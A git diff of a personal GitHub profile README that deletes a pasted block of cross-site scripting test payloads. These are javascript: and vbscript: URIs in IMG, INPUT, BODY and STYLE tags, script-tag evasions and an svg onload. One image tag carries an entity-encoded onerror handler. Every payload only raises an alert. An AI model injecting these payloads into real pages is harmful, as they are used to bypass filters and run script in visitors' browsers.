@@ -40,44 +40,7 @@
 <p>
   <img align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=ahmed777-android&show_icons=true&locale=en&layout=compact" alt="ahmed777-android" />
 </p>
-  <img src="wordmark.svg" alt="java" &#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x35;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x32;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x64;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x66;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x62;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x37;&#x34;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x62;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x63;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x65;&#x3b;&#x26;&#x23;&#x78;&#x36;&#x37;&#x3b;&#x26;&#x23;&#x78;&#x35;&#x64;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x38;&#x3b;&#x26;&#x23;&#x78;&#x33;&#x30;&#x3b;&#x26;&#x23;&#x78;&#x32;&#x39;&#x3b;
-  width="40" height="40"/> </a>
-<IMG SRC =  &#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29  >
-  perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
-
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-<<SCRIPT>alert("XSS");//\<</SCRIPT>
-
-</TITLE><SCRIPT>alert("XSS");</SCRIPT>
-
-<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 
 
-<BODY BACKGROUND="javascript:alert('XSS')">
 
-INPUT Image
-<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
-
-BODY Image
-<BODY BACKGROUND="javascript:alert('XSS')">
-
-IMG Dynsrc
-<IMG DYNSRC="javascript:alert('XSS')">
-
-IMG Lowsrc
-<IMG LOWSRC="javascript:alert('XSS')">
-
-List-style-image
-Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
-
-<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
-
-VBscript in an Image
-<IMG SRC='vbscript:msgbox("XSS")'>
-
-Livescript (older versions of Netscape only)
-<IMG SRC="livescript:[code]">
-
-SVG Object Tag
-<svg/onload=alert('XSS')>
 
